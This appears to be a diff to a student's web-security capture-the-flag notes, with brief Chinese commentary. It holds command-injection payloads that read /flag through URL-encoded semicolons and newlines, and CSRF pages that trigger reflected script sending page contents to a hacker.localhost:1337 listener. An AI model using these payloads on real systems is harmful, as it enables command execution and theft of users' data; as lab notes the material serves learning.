@@ -49,7 +49,7 @@ CMDi5
     --curl "http://challenge/localhost/scenario?path=/challenge/PWN;cat%20/flag>%20/tmp/flag"
 
 CMDi6
-    --curl "http://challenge.localhost/quest?location=/challenge%0Acat%20/flag"
+    --curl "http://challenge.localhost/goal?subdirectory=/challenge%0Acat%20/flag>%20/tmp/flag2"
          在Shell的环境中换行符的作用是等同于分号的，所以会执行两个命令，即使不允许使用|和;也可以通过换行符来执行命令
 
 SQLI3
@@ -192,7 +192,6 @@ fetch('/draft')
 
 
 csrf 1
-    -
     <!DOCTYPE html>
 <html>
   <head>
@@ -283,3 +282,20 @@ CSRF 4
     .then(response => response.text())
     .then(data => console.log(data))
     .then(fetch(http://hacker.localhost:1337/))
+
+
+
+
+CSRF 5
+<html>
+<head>
+<meta charset="UTF-8">
+</head><body>
+    <script>window.location.href="http://challenge.localhost/ephemeral?msg="+encodeURIComponent
+    ("<script>fetch('http://challenge.localhost/')
+    .then(r=>r.text())
+    .then(data=>fetch('http://hacker.localhost:1337/'+data))
+<\/script>");
+</script>
+</body>
+</html>
